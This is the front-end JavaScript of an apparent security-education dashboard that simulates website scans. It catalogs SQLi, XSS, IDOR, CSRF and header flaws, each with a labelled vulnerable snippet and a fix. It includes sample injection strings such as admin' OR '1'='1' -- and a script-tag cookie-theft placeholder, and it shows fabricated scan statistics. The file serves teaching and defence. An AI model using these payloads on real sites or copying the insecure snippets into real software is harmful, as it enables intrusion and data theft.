/* ==========================================================================
   VULNTRACK — JAVASCRIPT CORE PLATFORM ENGINE (v4.5)
   Features Implemented:
     1. Dual Mode Theme Switcher (Clean Light & Sleek Dark) with Persistence
     2. Global Stats Ticker & Live Threat Activity Stream
     3. Target URL Scanner, Live Screenshot Capture & Hotspot Navigation
     4. Dynamic Vulnerability Tracker (Scores, Grades, CVSS, Remediation)
     5. AI-Powered Executive Security Report Generator
     6. Interactive Attack Simulator (Custom Payloads, Step Execution, Defense Shield)
     7. Fix & Verify Automated Verification System
     8. Attack Path Visualization (Interactive SVG Node Diagram)
     9. Website Security Comparison Engine (Side-by-side Benchmark)
     10. Risk Prediction & Financial Breach Exposure Analytics
     11. OWASP Top 10 Compliance Matrix (A01:2021 to A10:2021)
     12. Chronological Security Lifecycle Timeline
     13. Interactive Academy & Sandbox Labs (SQLi, XSS & Knowledge Quiz)
     14. CyberAI Security Assistant Drawer & Chatbot
     15. Professional PDF Audit Report Generator
   ========================================================================== */

'use strict';

// ==========================================================================
// 1. THEME MANAGEMENT (Light & Dark Shades)
// ==========================================================================
const themeToggleBtn = document.getElementById('themeToggle');
const themeLabelText = document.getElementById('themeLabelText');

function initTheme() {
  const savedTheme = localStorage.getItem('vulntrack_theme');
  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
  const initialTheme = savedTheme ? savedTheme : (prefersDark ? 'dark' : 'light');
  applyTheme(initialTheme);
}

function applyTheme(theme) {
  document.documentElement.setAttribute('data-theme', theme);
  localStorage.setItem('vulntrack_theme', theme);
  if (themeLabelText) {
    themeLabelText.textContent = theme === 'dark' ? 'Dark' : 'Light';
  }
}

function toggleTheme() {
  const current = document.documentElement.getAttribute('data-theme') || 'dark';
  const newTheme = current === 'dark' ? 'light' : 'dark';
  applyTheme(newTheme);
}

if (themeToggleBtn) {
  themeToggleBtn.addEventListener('click', toggleTheme);
}
initTheme();

// ==========================================================================
// 2. NAVBAR SCROLL & MOBILE MENU & SMOOTH SCROLLING
// ==========================================================================
const navbar = document.getElementById('navbar');
const hamburger = document.getElementById('hamburger');
const navLinks = document.querySelector('.nav-links');

window.addEventListener('scroll', () => {
  if (navbar) {
    navbar.classList.toggle('scrolled', window.scrollY > 30);
  }
});

function toggleMobileMenu() {
  if (navLinks) {
    navLinks.classList.toggle('mobile-open');
    if (hamburger) {
      hamburger.classList.toggle('active');
    }
  }
}

function closeMobileMenu() {
  if (navLinks && navLinks.classList.contains('mobile-open')) {
    navLinks.classList.remove('mobile-open');
    if (hamburger) hamburger.classList.remove('active');
  }
}

if (hamburger) {
  hamburger.addEventListener('click', e => {
    e.stopPropagation();
    toggleMobileMenu();
  });
}

// Close mobile menu if clicked outside
document.addEventListener('click', e => {
  if (navLinks && navLinks.classList.contains('mobile-open')) {
    if (!navLinks.contains(e.target) && !hamburger.contains(e.target)) {
      closeMobileMenu();
    }
  }
});

// Reset on screen resize
window.addEventListener('resize', () => {
  if (window.innerWidth > 768) {
    closeMobileMenu();
  }
});

document.querySelectorAll('a[href^="#"]').forEach(link => {
  link.addEventListener('click', e => {
    const href = link.getAttribute('href');
    if (!href || href === '#') return;
    const target = document.querySelector(href);
    if (target) {
      e.preventDefault();
      closeMobileMenu();
      target.scrollIntoView({ behavior: 'smooth' });
    }
  });
});

// ==========================================================================
// 3. GLOBAL PLATFORM STATS & LIVE TICKER
// ==========================================================================
let globalScannedCount = 152840;
let globalVulnCount = 384192;
let globalFixedCount = 219540;

const globalTotalScanned = document.getElementById('globalTotalScanned');
const globalTotalVulns = document.getElementById('globalTotalVulns');
const globalTotalFixed = document.getElementById('globalTotalFixed');
const liveTickerMarquee = document.getElementById('liveTickerMarquee');

const LIVE_TICKER_FEED = [
  '🟢 Live Audit: fintech-gateway.io verified · 🔴 Alert: unencrypted POST on health-portal.org · 🛡️ CSP active on ecommerce-cloud.shop',
  '🛡️ Patch Verified: SQLi neutralized on cloud-saas.app · ⚡ 4 threats blocked by Defense Shield on dev-staging.net',
  '🟢 SSL/TLS 1.3 Certified: bank-connect.us · ⚠️ Open XSS flagged on student-forum.edu · 🛡️ Rate limit enforced on api-v2.io',
  '🛡️ OWASP A01 Audit completed for global-payments.co · 🟢 Zero open critical vulnerabilities found'
];
let currentTickerIdx = 0;

if (liveTickerMarquee) {
  setInterval(() => {
    currentTickerIdx = (currentTickerIdx + 1) % LIVE_TICKER_FEED.length;
    liveTickerMarquee.style.opacity = '0';
    setTimeout(() => {
      liveTickerMarquee.textContent = LIVE_TICKER_FEED[currentTickerIdx];
      liveTickerMarquee.style.opacity = '1';
    }, 400);
  }, 7000);
}

function refreshGlobalStats() {
  if (globalTotalScanned) globalTotalScanned.textContent = globalScannedCount.toLocaleString();
  if (globalTotalVulns) globalTotalVulns.textContent = globalVulnCount.toLocaleString();
  if (globalTotalFixed) globalTotalFixed.textContent = globalFixedCount.toLocaleString();
}

// ==========================================================================
// 4. VULNERABILITY INTELLIGENCE CATALOG
// ==========================================================================
const VULNERABILITY_CATALOG = [
  {
    id: 'vuln-sql',
    name: 'SQL Database Injection (SQLi)',
    category: 'OWASP A03:2021 — Injection Flaw',
    cwe: 'CWE-89',
    cvss: '9.8',
    severity: 'crit',
    status: 'open',
    path: '/api/v1/auth/login & /search?q=',
    easyExplanation: 'Imagine an apartment building where anyone can walk up to the receptionist and say: "Give me John\'s key, OR give me the master key to all 500 apartments!" Because the receptionist blindly follows whatever note is handed to them, anyone can enter all rooms and steal everything.',
    howHackerEnters: {
      entryVector: 'Login fields, search query parameters (?id=, ?q=), API endpoints',
      reason: 'The web application glues user-typed text directly into database SQL commands using string concatenation, instead of treating user input as untrusted data.',
      consequence: 'Attackers input special SQL characters (\' OR 1=1 --) to trick the database into returning all usernames, hashed passwords, credit cards, or executing admin commands.'
    },
    riskFactor: {
      rating: 'CRITICAL',
      impacts: ['Complete Customer Database Leak', 'Authentication Bypass', 'Ransomware Extortion', 'Regulatory GDPR/PCI Fines']
    },
    solution: {
      steps: [
        'Replace all raw SQL concatenations with Parameterized Queries (Prepared Statements).',
        'Use modern ORMs (such as Prisma, TypeORM, Hibernate, or SQLAlchemy) with automatic parameter binding.',
        'Apply the Principle of Least Privilege: ensure your database user has read-only access where writes are not needed.',
        'Deploy Web Application Firewall (WAF) signatures to detect and block SQL injection patterns at the network edge.'
      ],
      vulnerableCode: `// ❌ VULNERABLE: Direct string concatenation
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND pass = '" + req.body.password + "'";
db.query(query);`,
      secureCode: `// ✅ SECURE: Parameterized query (Prepared statement)
const query = "SELECT id, email, role FROM users WHERE email = ? AND pass = ?";
db.query(query, [req.body.email, hashedInputPassword]);`
    },
    hotspotId: 'hotspotLogin',
    videoKey: 'sql'
  },
  {
    id: 'vuln-xss',
    name: 'Cross-Site Scripting (Reflected & Stored XSS)',
    category: 'OWASP A03:2021 — Script Injection',
    cwe: 'CWE-79',
    cvss: '8.4',
    severity: 'high',
    status: 'open',
    path: '/search?query= & /comments/submit',
    easyExplanation: 'A hacker slips a malicious sticky note onto a public bulletin board. When other regular visitors come by to read the board, their eyes secretly get tricked into following secret instructions that email their house keys to the hacker.',
    howHackerEnters: {
      entryVector: 'Search bars, user comment sections, profile bio fields, URL parameters',
      reason: 'The server renders untrusted user text straight into the HTML page without encoding special characters like <, >, and quotes.',
      consequence: 'The browser runs the attacker\'s script thinking it came from your website. The script steals session cookies, redirects visitors to phishing clones, or logs keystrokes.'
    },
    riskFactor: {
      rating: 'HIGH',
      impacts: ['User Session Hijacking', 'Website Defacement', 'Malware Drive-By Downloads', 'Credential Harvesting']
    },
    solution: {
      steps: [
        'Context-aware output encoding: convert special characters like < into &lt; before printing them into HTML.',
        'Implement a strict Content Security Policy (CSP) header (e.g. Content-Security-Policy: default-src \'self\').',
        'Set HttpOnly and SameSite=Lax flags on all authentication cookies so client-side JavaScript cannot read them.',
        'Use modern frontend frameworks (React, Vue, Angular) which automatically escape rendered variables.'
      ],
      vulnerableCode: `<!-- ❌ VULNERABLE: Rendering raw HTML directly -->
<div id="results">Search results for: <%= req.query.q %></div>
document.getElementById('results').innerHTML = userInput;`,
      secureCode: `<!-- ✅ SECURE: Context encoding / textContent -->
<div id="results">Search results for: <%= encodeHTML(req.query.q) %></div>
document.getElementById('results').textContent = userInput;`
    },
    hotspotId: 'hotspotSearch',
    videoKey: 'xss'
  },
  {
    id: 'vuln-auth',
    name: 'Broken Access Control & Insecure Session Tokens',
    category: 'OWASP A01:2021 — Broken Access Control',
    cwe: 'CWE-384',
    cvss: '8.8',
    severity: 'high',
    status: 'open',
    path: '/api/v1/user/account & /admin/dashboard',
    easyExplanation: 'A hotel room key that is just a simple number stamped on plastic (e.g. Room 101, Room 102). Any guest can guess the next number and walk into someone else\'s room without the system asking for a password or identity check.',
    howHackerEnters: {
      entryVector: 'IDOR parameters (/api/user?id=102), predictable session tokens, missing role authorization checks',
      reason: 'The server trusts client-provided IDs without verifying that the logged-in user actually owns that specific record.',
      consequence: 'Attackers change their user ID to someone else\'s and download private customer records, credit cards, and invoices.'
    },
    riskFactor: {
      rating: 'HIGH',
      impacts: ['Horizontal Privilege Escalation', 'Mass Customer Identity Theft', 'Administrative Account Takeover']
    },
    solution: {
      steps: [
        'Enforce strict server-side authorization checks on every endpoint: verify req.session.userId === record.ownerId.',
        'Use random, cryptographically strong UUIDv4 tokens rather than sequential auto-incrementing numbers.',
        'Adopt Role-Based Access Control (RBAC) middleware for all sensitive administrative routes.'
      ],
      vulnerableCode: `// ❌ VULNERABLE: No ownership validation (IDOR)
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.findInvoice(req.params.id);
  res.json(invoice);
});`,
      secureCode: `// ✅ SECURE: Ownership & authorization verification
app.get('/api/invoice/:id', authenticateToken, async (req, res) => {
  const invoice = await db.findInvoice(req.params.id);
  if (!invoice || invoice.userId !== req.user.id) {
    return res.status(403).json({ error: 'Access Denied' });
  }
  res.json(invoice);
});`
    },
    hotspotId: null,
    videoKey: 'auth'
  },
  {
    id: 'vuln-csrf',
    name: 'Cross-Site Request Forgery (CSRF)',
    category: 'OWASP A01:2021 — Broken Access Control',
    cwe: 'CWE-352',
    cvss: '7.5',
    severity: 'med',
    status: 'open',
    path: '/user/update-email & /account/transfer',
    easyExplanation: 'You leave your bank\'s website logged in. You open a game website in another tab. That game secretly tells your bank: "Transfer $1,000 to Hacker!" Because your browser still has your bank session active, the bank approves the transfer without asking.',
    howHackerEnters: {
      entryVector: 'State-changing HTTP POST/PUT forms lacking anti-forgery tokens',
      reason: 'Browsers automatically include cookies with cross-site requests unless explicitly prohibited by SameSite attributes or unique CSRF tokens.',
      consequence: 'Attackers trick logged-in victims into changing their email addresses, triggering password resets, transferring funds, or posting unauthorized content.'
    },
    riskFactor: {
      rating: 'MEDIUM',
      impacts: ['Unauthorized Account Takeover', 'Fraudulent Financial Transactions', 'Unintended Account Deletion']
    },
    solution: {
      steps: [
        'Include an unpredictable, cryptographically strong Anti-CSRF Token in every state-changing form and verify it on the server.',
        'Set SameSite=Strict or SameSite=Lax on all sensitive cookies.',
        'Require users to re-enter their current password before modifying high-risk credentials or emails.'
      ],
      vulnerableCode: `<!-- ❌ VULNERABLE: Standard form with no CSRF validation -->
<form action="/user/update-email" method="POST">
  <input name="email" value="new@email.com" />
  <button type="submit">Update</button>
</form>`,
      secureCode: `<!-- ✅ SECURE: Form protected with Anti-CSRF Token -->
<form action="/user/update-email" method="POST">
  <input type="hidden" name="_csrf" value="9f8e7d6c5b4a3..." />
  <input name="email" value="new@email.com" />
  <button type="submit">Update</button>
</form>`
    },
    hotspotId: null,
    videoKey: 'csrf'
  },
  {
    id: 'vuln-headers',
    name: 'Missing Security Headers (CSP, HSTS & X-Frame-Options)',
    category: 'OWASP A05:2021 — Security Misconfiguration',
    cwe: 'CWE-1021',
    cvss: '6.5',
    severity: 'med',
    status: 'open',
    path: 'HTTP Response Headers',
    easyExplanation: 'Like mailing a confidential letter without sealing the envelope, or a shop with transparent glass doors that anyone can embed into an invisible fake wall (Clickjacking). Without security headers, browsers don\'t know what defenses to enforce.',
    howHackerEnters: {
      entryVector: 'Public HTTP requests missing defensive response headers',
      reason: 'Web server (Nginx/Apache/Cloudflare) has default settings and does not instruct the visitor\'s browser to block iframes or enforce HTTPS.',
      consequence: 'Attackers can embed your website into an invisible iframe to trick users into clicking buttons (Clickjacking) or downgrade SSL connections.'
    },
    riskFactor: {
      rating: 'MEDIUM',
      impacts: ['Clickjacking UI Redress', 'SSL Strip Man-in-the-Middle Attacks', 'MIME-Type Sniffing Exploits']
    },
    solution: {
      steps: [
        'Add Content-Security-Policy (CSP) to restrict scripts only to trusted domains.',
        'Add Strict-Transport-Security: max-age=63072000; includeSubDomains; preload to enforce HTTPS everywhere.',
        'Add X-Frame-Options: DENY or SAMEORIGIN to prevent malicious clickjacking iframes.',
        'Add X-Content-Type-Options: nosniff to stop browsers from misinterpreting files as scripts.'
      ],
      vulnerableCode: `// ❌ VULNERABLE: Missing headers in Nginx configuration
server {
    listen 80;
    server_name example.com;
}`,
      secureCode: `// ✅ SECURE: Recommended HTTP Security Headers in Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self';";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;`
    },
    hotspotId: null,
    videoKey: 'headers'
  }
];

// Active State
let currentTrackedVulns = JSON.parse(JSON.stringify(VULNERABILITY_CATALOG));
let currentTargetUrl = 'https://example.com';
let activeFilter = 'all';

// Security Lifecycle Timeline Events
let securityTimelineEvents = [
  { time: '10:14 AM', type: 'info', title: 'Target Scan Initiated', desc: 'Crawler analyzed application endpoints and HTTP response headers.' },
  { time: '10:15 AM', type: 'crit', title: 'Critical Vulnerabilities Detected', desc: 'SQLi and XSS loopholes flagged with CVSS > 8.0.' },
  { time: '10:18 AM', type: 'info', title: 'AI Risk Synthesis Generated', desc: 'Strategic executive report synthesized with prioritized patch directives.' }
];

// ==========================================================================
// 5. SCANNER CONTROLLER & SIMULATION
// ==========================================================================
const scanBtn = document.getElementById('scanBtn');
const scanUrlInput = document.getElementById('scanUrl');
const heroScanBtn = document.getElementById('heroScanBtn');
const heroScanInput = document.getElementById('heroScanInput');
const rescanBtn = document.getElementById('rescanBtn');

const idleState = document.getElementById('scanIdleState');
const progressState = document.getElementById('scanProgressState');
const doneState = document.getElementById('scanDoneState');
const progressFill = document.getElementById('progressFill');
const progressPct = document.getElementById('progressPct');
const progressChecks = document.getElementById('progressChecks');
const progTargetLabel = document.getElementById('progTargetLabel');

const SCAN_TERMINAL_STEPS = [
  { text: '[ ✓ ] Resolving DNS and SSL/TLS certificate chain...', type: 'ok' },
  { text: '[ ✓ ] Testing TLS 1.3 encryption & HSTS policy...', type: 'ok' },
  { text: '[ ⚠️ ] Missing Content-Security-Policy header detected', type: 'warn' },
  { text: '[ ✓ ] Crawling application endpoints & sitemap...', type: 'info' },
  { text: '[ ! ] Testing SQL injection vectors on /api/v1/auth/login...', type: 'danger' },
  { text: '[ ! ] SQLi Loophole confirmed: Unsanitized database parameter', type: 'danger' },
  { text: '[ ⚡ ] Testing Reflected XSS payloads on query inputs...', type: 'warn' },
  { text: '[ ⚠️ ] Unescaped HTML output reflected in search response', type: 'warn' },
  { text: '[ ✓ ] Checking anti-CSRF token protection on POST forms...', type: 'info' },
  { text: '[ ⚠️ ] Missing CSRF protection on state-changing endpoints', type: 'warn' },
  { text: '[ ✓ ] Auditing session cookie attributes (HttpOnly, Secure)...', type: 'info' },
  { text: '[ ✓ ] Correlating CVE databases and OWASP Top 10 matrix...', type: 'ok' },
  { text: '[ ✓ ] Capturing live website screenshot & hotspot mapping...', type: 'ok' },
  { text: '[ 🛡️ ] Vulnerability assessment complete. Generating AI security report...', type: 'ok' }
];

function triggerScan(targetUrl) {
  let url = (targetUrl || (scanUrlInput ? scanUrlInput.value : '') || (heroScanInput ? heroScanInput.value : '')).trim();
  if (!url) {
    if (scanUrlInput) {
      scanUrlInput.placeholder = '⚠️ Please enter a website URL first!';
      scanUrlInput.focus();
    }
    return;
  }

  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'https://' + url;
  }

  currentTargetUrl = url;
  if (scanUrlInput) scanUrlInput.value = url;
  if (heroScanInput) heroScanInput.value = url;

  // Increment platform statistics
  globalScannedCount += 1;
  globalVulnCount += 4;
  refreshGlobalStats();

  const scannerSection = document.getElementById('scanner');
  if (scannerSection) {
    scannerSection.scrollIntoView({ behavior: 'smooth' });
  }

  if (idleState) idleState.style.display = 'none';
  if (doneState) doneState.style.display = 'none';
  if (progressState) progressState.style.display = 'block';

  if (progTargetLabel) progTargetLabel.textContent = `Target: ${currentTargetUrl}`;
  if (progressFill) progressFill.style.width = '0%';
  if (progressPct) progressPct.textContent = '0%';
  if (progressChecks) progressChecks.innerHTML = '';

  let stepIndex = 0;
  let pct = 0;

  const interval = setInterval(() => {
    pct += Math.random() * 14 + 8;
    if (pct > 100) pct = 100;

    if (progressFill) progressFill.style.width = `${pct}%`;
    if (progressPct) progressPct.textContent = `${Math.floor(pct)}%`;

    if (stepIndex < SCAN_TERMINAL_STEPS.length) {
      const step = SCAN_TERMINAL_STEPS[stepIndex];
      const logLine = document.createElement('div');
      logLine.className = `log-line ${step.type}`;
      logLine.textContent = step.text;
      if (progressChecks) {
        progressChecks.appendChild(logLine);
        progressChecks.scrollTop = progressChecks.scrollHeight;
      }
      stepIndex++;
    }

    if (pct >= 100 && stepIndex >= SCAN_TERMINAL_STEPS.length) {
      clearInterval(interval);
      setTimeout(renderScanResults, 400);
    }
  }, 200);
}

function renderScanResults() {
  if (progressState) progressState.style.display = 'none';
  if (doneState) doneState.style.display = 'flex';

  let domain = 'example.com';
  try {
    const parsed = new URL(currentTargetUrl);
    domain = parsed.hostname;
  } catch (e) {
    domain = currentTargetUrl.replace(/https?:\/\//, '').split('/')[0];
  }

  const reportDomain = document.getElementById('reportDomain');
  const screenshotDomainLabel = document.getElementById('screenshotDomainLabel');
  const screenshotUrlBar = document.getElementById('screenshotUrlBar');
  const reportTimestamp = document.getElementById('reportTimestamp');
  const timelineDomain = document.getElementById('timelineDomain');

  if (reportDomain) reportDomain.textContent = domain;
  if (screenshotDomainLabel) screenshotDomainLabel.textContent = domain;
  if (screenshotUrlBar) screenshotUrlBar.textContent = currentTargetUrl;
  if (timelineDomain) timelineDomain.textContent = domain;
  if (reportTimestamp) reportTimestamp.textContent = `Scanned ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;

  // Add scan event to timeline
  addTimelineEntry('info', `Target Audited: ${domain}`, `Discovered 5 potential threat vectors across public endpoints.`);

  // Load screenshot
  loadWebsiteScreenshot(currentTargetUrl, domain);

  // Reset catalog
  currentTrackedVulns = JSON.parse(JSON.stringify(VULNERABILITY_CATALOG));

  // Render submodules
  renderVulnerabilityCards();
  updateTrackerMetrics();
  generateAiSecurityReport(domain);
  updatePredictionDashboard();
  renderOwaspMatrix();
  renderTimelineStream();
  renderAttackPath('sqli');
}

// Screenshot loader with multi-provider cascade + white-image detection
function loadWebsiteScreenshot(url, domain) {
  const imgEl = document.getElementById('siteScreenshotImg');
  const modalImg = document.getElementById('modalScreenshotImg');
  const screenshotArea = document.getElementById('screenshotDisplayArea');
  if (!imgEl) return;

  // Add loading state
  imgEl.style.opacity = '0.3';
  imgEl.style.filter = 'blur(4px)';
  if (screenshotArea) screenshotArea.classList.add('screenshot-loading');

  // Multiple screenshot API providers in cascade order
  const SCREENSHOT_PROVIDERS = [
    u => `https://image.thum.io/get/width/960/crop/600/${encodeURIComponent(u)}`,
    u => `https://api.screenshotmachine.com/?key=demo&url=${encodeURIComponent(u)}&dimension=1024x768&format=png`,
    u => `https://s0.wp.com/mshots/v1/${encodeURIComponent(u)}?w=960&h=600`,
  ];

  let providerIdx = 0;

  function tryNextProvider() {
    if (providerIdx >= SCREENSHOT_PROVIDERS.length) {
      // All providers failed — use rich SVG mock
      showFallbackSvg();
      return;
    }
    const apiUrl = SCREENSHOT_PROVIDERS[providerIdx++](url);
    const tempImg = new Image();
    tempImg.crossOrigin = 'anonymous';

    tempImg.onload = () => {
      // Detect if image is mostly white/blank using canvas
      let isBlank = false;
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 40; canvas.height = 25;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(tempImg, 0, 0, 40, 25);
        const data = ctx.getImageData(0, 0, 40, 25).data;
        let whitePixels = 0;
        for (let i = 0; i < data.length; i += 4) {
          if (data[i] > 230 && data[i+1] > 230 && data[i+2] > 230) whitePixels++;
        }
        // If >85% of sampled pixels are near-white, it's a blank placeholder
        isBlank = whitePixels / (40 * 25) > 0.85;
      } catch(e) { isBlank = false; }

      if (isBlank) {
        tryNextProvider();
      } else {
        applyScreenshot(apiUrl);
      }
    };

    tempImg.onerror = () => tryNextProvider();

    // 6-second timeout per provider
    const timeout = setTimeout(() => { tempImg.src = ''; tryNextProvider(); }, 6000);
    tempImg.onload = function() {
      clearTimeout(timeout);
      let isBlank = false;
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 40; canvas.height = 25;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(tempImg, 0, 0, 40, 25);
        const data = ctx.getImageData(0, 0, 40, 25).data;
        let whitePixels = 0;
        for (let i = 0; i < data.length; i += 4) {
          if (data[i] > 230 && data[i+1] > 230 && data[i+2] > 230) whitePixels++;
        }
        isBlank = whitePixels / (40 * 25) > 0.85;
      } catch(e) { isBlank = false; }
      if (isBlank) { tryNextProvider(); } else { applyScreenshot(apiUrl); }
    };
    tempImg.onerror = function() { clearTimeout(timeout); tryNextProvider(); };
    tempImg.src = apiUrl;
  }

  function applyScreenshot(src) {
    imgEl.src = src;
    imgEl.style.opacity = '1';
    imgEl.style.filter = 'none';
    if (modalImg) modalImg.src = src;
    if (screenshotArea) screenshotArea.classList.remove('screenshot-loading');
  }

  function showFallbackSvg() {
    const fallbackSvg = generateMockSiteSvg(domain);
    applyScreenshot(fallbackSvg);
    // Show a friendly note that the screenshot is a demo visualization
    const overlayInfo = screenshotArea?.querySelector('.screenshot-overlay-info');
    if (overlayInfo) {
      overlayInfo.innerHTML = `<span>🎨 Live screenshot unavailable — showing <strong>interactive security visualization</strong> for <strong id="screenshotDomainLabel">${domain}</strong>. Click hotspots to inspect vulnerabilities.</span>`;
    }
  }

  tryNextProvider();
}

function generateMockSiteSvg(domain) {
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="960" height="600" viewBox="0 0 960 600">
    <rect width="960" height="600" fill="#0b1329" />
    <rect x="0" y="0" width="960" height="50" fill="#132042" />
    <circle cx="25" cy="25" r="6" fill="#ef4444" />
    <circle cx="45" cy="25" r="6" fill="#f59e0b" />
    <circle cx="65" cy="25" r="6" fill="#10b981" />
    <rect x="100" y="12" width="460" height="26" rx="6" fill="#0b1329" stroke="#1e293b" />
    <text x="120" y="29" fill="#94a3b8" font-family="monospace" font-size="12">https://${domain}/secure/portal</text>
    <rect x="60" y="90" width="340" height="36" rx="8" fill="#0284c7" fill-opacity="0.2" />
    <text x="75" y="115" fill="#38bdf8" font-family="sans-serif" font-size="20" font-weight="bold">${domain}</text>
    <rect x="60" y="150" width="520" height="12" rx="4" fill="#1e293b" />
    <rect x="60" y="172" width="380" height="12" rx="4" fill="#1e293b" />
    <rect x="60" y="220" width="360" height="230" rx="12" fill="#132042" stroke="#334155" />
    <text x="90" y="260" fill="#f8fafc" font-family="sans-serif" font-size="16" font-weight="bold">Account Login</text>
    <text x="90" y="285" fill="#94a3b8" font-family="sans-serif" font-size="12">Username / Email</text>
    <rect x="90" y="295" width="300" height="36" rx="6" fill="#0b1329" stroke="#ef4444" stroke-width="2" />
    <text x="105" y="318" fill="#f87171" font-family="monospace" font-size="12">admin' OR '1'='1' --</text>
    <rect x="90" y="345" width="300" height="36" rx="6" fill="#0b1329" stroke="#334155" />
    <rect x="90" y="395" width="130" height="34" rx="6" fill="#0284c7" />
    <rect x="450" y="220" width="450" height="230" rx="12" fill="#132042" stroke="#334155" />
    <text x="480" y="260" fill="#f8fafc" font-family="sans-serif" font-size="16" font-weight="bold">Public Search Directory</text>
    <text x="480" y="285" fill="#94a3b8" font-family="sans-serif" font-size="12">Search query input</text>
    <rect x="480" y="295" width="390" height="36" rx="6" fill="#0b1329" stroke="#f59e0b" stroke-width="2" />
    <text x="495" y="318" fill="#fbbf24" font-family="monospace" font-size="12">&lt;script&gt;stealCookies()&lt;/script&gt;</text>
  </svg>`;
  return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
}

// ==========================================================================
// 6. VULNERABILITY TRACKER CARDS & DYNAMIC SCORE RECALCULATION
// ==========================================================================
function updateTrackerMetrics() {
  const total = currentTrackedVulns.length;
  let crit = 0, high = 0, med = 0, low = 0, resolved = 0;

  currentTrackedVulns.forEach(v => {
    if (v.status === 'resolved') {
      resolved++;
    } else {
      if (v.severity === 'crit') crit++;
      else if (v.severity === 'high') high++;
      else if (v.severity === 'med') med++;
      else if (v.severity === 'low') low++;
    }
  });

  const openCount = currentTrackedVulns.filter(v => v.status === 'open').length;
  const progressCount = currentTrackedVulns.filter(v => v.status === 'progress').length;

  const statTotal = document.getElementById('statTotal');
  const statCrit = document.getElementById('statCrit');
  const statHigh = document.getElementById('statHigh');
  const statMed = document.getElementById('statMed');
  const statLow = document.getElementById('statLow');
  const statResolved = document.getElementById('statResolved');

  if (statTotal) statTotal.textContent = total;
  if (statCrit) statCrit.textContent = crit;
  if (statHigh) statHigh.textContent = high;
  if (statMed) statMed.textContent = med;
  if (statLow) statLow.textContent = low;
  if (statResolved) statResolved.textContent = resolved;

  const fAll = document.getElementById('filterCountAll');
  const fOpen = document.getElementById('filterCountOpen');
  const fProgress = document.getElementById('filterCountProgress');
  const fResolved = document.getElementById('filterCountResolved');

  if (fAll) fAll.textContent = total;
  if (fOpen) fOpen.textContent = openCount;
  if (fProgress) fProgress.textContent = progressCount;
  if (fResolved) fResolved.textContent = resolved;

  const pctResolved = total > 0 ? Math.round((resolved / total) * 100) : 0;
  const remediationPct = document.getElementById('remediationPct');
  const remediationBarFill = document.getElementById('remediationBarFill');
  if (remediationPct) remediationPct.textContent = `${pctResolved}% Secured`;
  if (remediationBarFill) remediationBarFill.style.width = `${pctResolved}%`;

  let score = 100 - (crit * 20 + high * 12 + med * 6 + low * 2);
  if (score < 20) score = 20;
  if (score > 100) score = 100;
  if (resolved === total && total > 0) score = 98;

  let grade = 'A';
  let gradeColor = 'var(--resolved)';
  if (score < 50) { grade = 'F'; gradeColor = 'var(--critical)'; }
  else if (score < 65) { grade = 'D'; gradeColor = 'var(--critical)'; }
  else if (score < 75) { grade = 'C'; gradeColor = 'var(--high)'; }
  else if (score < 85) { grade = 'B-'; gradeColor = 'var(--medium)'; }
  else if (score < 95) { grade = 'A-'; gradeColor = 'var(--resolved)'; }
  else { grade = 'A+'; gradeColor = 'var(--resolved)'; }

  const scoreNumeric = document.getElementById('scoreNumeric');
  const scoreGradeLetter = document.getElementById('scoreGradeLetter');
  const scorePostureText = document.getElementById('scorePostureText');
  const scoreCircleFill = document.getElementById('scoreCircleFill');

  if (scoreNumeric) scoreNumeric.textContent = `${score}/100`;
  if (scoreGradeLetter) {
    scoreGradeLetter.textContent = grade;
    scoreGradeLetter.style.color = gradeColor;
  }
  if (scorePostureText) {
    const unaddressed = total - resolved;
    scorePostureText.textContent = unaddressed === 0 ? 'Fully Secured · All Flaws Verified & Resolved' : `${unaddressed} Open Issues Need Attention`;
  }

  if (scoreCircleFill) {
    const offset = 264 - (264 * (score / 100));
    scoreCircleFill.style.strokeDashoffset = offset;
    scoreCircleFill.style.stroke = gradeColor;
  }
}

function renderVulnerabilityCards() {
  const container = document.getElementById('vulnTrackerList');
  if (!container) return;

  const searchQuery = (document.getElementById('trackerSearch')?.value || '').toLowerCase();

  const filtered = currentTrackedVulns.filter(v => {
    if (activeFilter === 'open' && v.status !== 'open') return false;
    if (activeFilter === 'progress' && v.status !== 'progress') return false;
    if (activeFilter === 'resolved' && v.status !== 'resolved') return false;
    if (activeFilter === 'crit' && v.severity !== 'crit') return false;

    if (searchQuery) {
      const matchName = v.name.toLowerCase().includes(searchQuery);
      const matchCategory = v.category.toLowerCase().includes(searchQuery);
      const matchEasy = v.easyExplanation.toLowerCase().includes(searchQuery);
      return matchName || matchCategory || matchEasy;
    }
    return true;
  });

  if (filtered.length === 0) {
    container.innerHTML = `
      <div style="text-align: center; padding: 48px; background: var(--bg-surface); border-radius: var(--radius-xl); border: 1px solid var(--border-subtle);">
        <span style="font-size: 2.2rem; display: block; margin-bottom: 8px;">🛡️</span>
        <h4 style="margin-bottom: 4px;">No vulnerabilities matching this filter</h4>
        <p style="color: var(--text-muted); font-size: 0.9rem;">Change your filter tabs or search query above.</p>
      </div>
    `;
    return;
  }

  container.innerHTML = filtered.map((item, idx) => `
    <div class="vuln-track-card severity-${item.severity}" id="card-${item.id}">
      <div class="card-header-bar" onclick="toggleVulnCard('${item.id}')" title="Click to expand vulnerability details">
        <div class="card-title-group">
          <span class="sev-badge ${item.severity}">${item.severity.toUpperCase()} · CVSS ${item.cvss}</span>
          <div>
            <h3>${item.name}</h3>
            <span class="card-category-tag">${item.category} · ${item.cwe} · 📍 ${item.path}</span>
          </div>
        </div>

        <div class="card-header-right">
          <div class="status-tracker-select" onclick="event.stopPropagation()">
            <span class="status-label">Status:</span>
            <select class="status-dropdown st-${item.status}" onchange="changeVulnStatus('${item.id}', this.value)">
              <option value="open" ${item.status === 'open' ? 'selected' : ''}>🔴 Open</option>
